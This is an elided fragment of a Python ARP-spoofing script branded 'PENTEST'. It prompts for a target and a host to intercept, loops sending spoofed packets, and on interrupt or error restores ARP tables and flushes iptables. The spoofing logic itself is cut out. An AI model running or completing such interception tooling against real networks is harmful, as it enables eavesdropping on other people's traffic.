...
target_value = input("PENTEST would need you to enter the target system>>")

host_value = input("PENTEST would need you to enter the host you wish to intercept>>")
...
try: 
    ...
    while True:
        ...
        print("\r[+] Packets sent by PENTEST: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]PENTEST Detected CTRL + c ...Resetting ARP Tables\n")
    restore(target, host)
    restore(host, target)
    subprocess.run(["sudo", "iptables", "--flush"])
except IndexError:
    print("\n[+] PENTEST Detected an error, try checking if router hasnt blocked 404...Quitting\n")
    subprocess.run(["sudo", "iptables", "--flush"])
    print("flushing iptables")
except Exception:
    print("\n[+] PENTEST Detected an error, check the values you inputed..Quitting\n")
    print("flushing iptables")
